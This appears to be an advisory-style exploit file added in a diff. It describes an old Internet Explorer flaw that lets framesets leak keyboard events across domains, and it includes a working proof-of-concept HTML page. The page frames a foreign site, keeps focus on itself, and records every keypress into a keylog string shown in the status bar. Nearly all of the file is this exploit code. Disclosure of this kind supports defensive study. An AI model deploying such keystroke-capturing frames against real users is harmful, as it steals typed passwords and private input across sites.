@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/9761/info
+
+Microsoft Internet Explorer is reported to be prone to an issue that may leak sensitive information across foreign domains.
+
+This issue could permit framesets in different domains to leak various events, including keyboard events. This could effectively permit a hostile web page to capture keystrokes from a foreign domain. 
+
+<html>
+<head><title>IE Cross Frame Scripting Restriction Bypass Example</title>
+<script>
+var keylog='';
+document.onkeypress = function () {
+k = window.event.keyCode;
+window.status = keylog += String.fromCharCode(k) + '[' + k +']';
+}
+</script>
+</head>
+<frameset onLoad="this.focus();" onBlur="this.focus();" cols="100%,*">
+<frame src="http://www.example.com" scrolling="auto">
+</frameset>
+</html> 
